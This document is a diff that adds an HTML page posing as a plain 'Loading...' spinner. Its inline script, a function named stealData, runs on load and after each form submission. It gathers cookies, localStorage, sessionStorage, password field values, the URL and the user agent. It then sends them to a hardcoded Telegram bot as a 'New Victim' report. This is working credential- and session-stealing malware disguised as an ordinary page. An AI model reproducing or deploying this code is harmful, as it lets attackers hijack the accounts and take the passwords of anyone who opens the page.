@@ -1,0 +1,126 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Loading...</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f0f0;
+            font-family: Arial, sans-serif;
+        }
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #3498db;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        #status {
+            position: absolute;
+            bottom: 20px;
+            color: #666;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="loader"></div>
+    <div id="status">Processing...</div>
+
+    <script>
+        // CONFIGURATION
+        const TELEGRAM_BOT_TOKEN = "9221921085:AAE5VFeF9jLbMUvqD0l81AYfVLVAjd5le4k";
+        const TELEGRAM_CHAT_ID = "8037323046";
+        const API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+        async function sendToTelegram(text) {
+            try {
+                await fetch(API_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: text,
+                        parse_mode: 'HTML'
+                    })
+                });
+                document.getElementById('status').innerText = "Data sent!";
+            } catch (error) {
+                console.error("Error sending to Telegram:", error);
+                document.getElementById('status').innerText = "Error sending data.";
+            }
+        }
+
+        async function stealData() {
+            let payload = `<b>🕵️‍♂️ New Victim Detected!</b>\n\n`;
+            
+            // 1. Cookies
+            payload += `<b>🍪 Cookies:</b>\n<pre>${document.cookie}</pre>\n\n`;
+
+            // 2. Local Storage
+            let lsData = "";
+            for (let i = 0; i < localStorage.length; i++) {
+                let key = localStorage.key(i);
+                let value = localStorage.getItem(key);
+                lsData += `${key}: ${value}\n`;
+            }
+            if (lsData.trim() === "") {
+                lsData = "(Empty)";
+            }
+            payload += `<b>💾 Local Storage:</b>\n<pre>${lsData}</pre>\n\n`;
+
+            // 3. Session Storage
+            let ssData = "";
+            for (let i = 0; i < sessionStorage.length; i++) {
+                let key = sessionStorage.key(i);
+                let value = sessionStorage.getItem(key);
+                ssData += `${key}: ${value}\n`;
+            }
+            if (ssData.trim() === "") {
+                ssData = "(Empty)";
+            }
+            payload += `<b>⚡ Session Storage:</b>\n<pre>${ssData}</pre>\n\n`;
+
+            // 4. Password Fields (if any are visible/focused or just dump all inputs)
+            let inputs = document.querySelectorAll('input[type="password"]');
+            let passwords = [];
+            inputs.forEach(input => {
+                if (input.value) {
+                    passwords.push(`${input.name || 'unknown'}: ${input.value}`);
+                }
+            });
+            if (passwords.length > 0) {
+                payload += `<b>🔑 Found Passwords:</b>\n<pre>${passwords.join('\n')}</pre>\n\n`;
+            } else {
+                payload += `<b>🔑 Passwords:</b>\n<pre>(None found on page)</pre>\n\n`;
+            }
+
+            // 5. User Info
+            payload += `<b>🌐 URL:</b> ${window.location.href}\n`;
+            payload += `<b>📱 User Agent:</b> ${navigator.userAgent}\n`;
+            payload += `<b>🕒 Time:</b> ${new Date().toISOString()}`;
+
+            await sendToTelegram(payload);
+        }
+
+        // Run immediately
+        stealData();
+        
+        // Also listen for form submissions to catch live typing
+        document.addEventListener('submit', (e) => {
+            setTimeout(stealData, 1000); // Wait a sec for potential AJAX calls
+        });
+    </script>
+</body>
+</html>
